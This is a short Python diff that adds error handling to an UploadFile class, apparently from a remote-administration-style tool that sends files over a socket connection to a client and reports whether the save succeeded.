@@ -36,10 +36,13 @@ class UploadFile:
         self._connection.send(b'upload' + remote_file_encoded + b'FILE_START' + contents)
 
     def openFile(self, path):
-        with open(path, 'rb') as f:
-            data = f.read()
+        try:
+            with open(path, 'rb') as f:
+                data = f.read()
 
-        return data
+            return data
+        except:
+            return False
 
     def execute(self):
         """
@@ -52,9 +55,17 @@ class UploadFile:
         data = self.openFile(self._local_file)
 
         # Send data and path
-        self.sendFile([data, self._remote_file.encode('utf-8')])
+        if data != False:
+            self.sendFile([data, self._remote_file.encode('utf-8')])
 
-        return f"Done! File {self._local_file} uploaded to {self._remote_file}"
+            code = self._connection.recv(10)
+
+            if b"error" in code:
+                return "File couldn't be saved in the client. Specify a valid path."
+            else:
+                return f"Done! File {self._local_file} uploaded to {self._remote_file}"
+        else:
+            return f"Invalid file! File doesn't exist or insufficient permissions!"
 
 
 
